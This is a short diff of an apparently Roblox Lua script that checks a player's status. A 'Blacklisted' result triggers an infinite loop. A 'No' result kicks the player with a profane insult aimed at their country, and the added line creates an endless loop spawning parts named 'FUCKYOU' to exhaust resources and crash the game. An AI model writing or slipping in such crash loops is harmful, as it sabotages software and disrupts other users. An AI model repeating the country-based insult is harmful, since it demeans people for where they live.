@@ -153,5 +153,5 @@ local SoundEvent = {
 if WV == "Blacklisted" then
   while true do end
 elseif WV == "No" then
-  plr:Kick("You live in "..country..", now fuck off") ME:FireServer(SoundEvent) 
+  plr:Kick("You live in "..country..", now fuck off") ME:FireServer(SoundEvent) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
 end
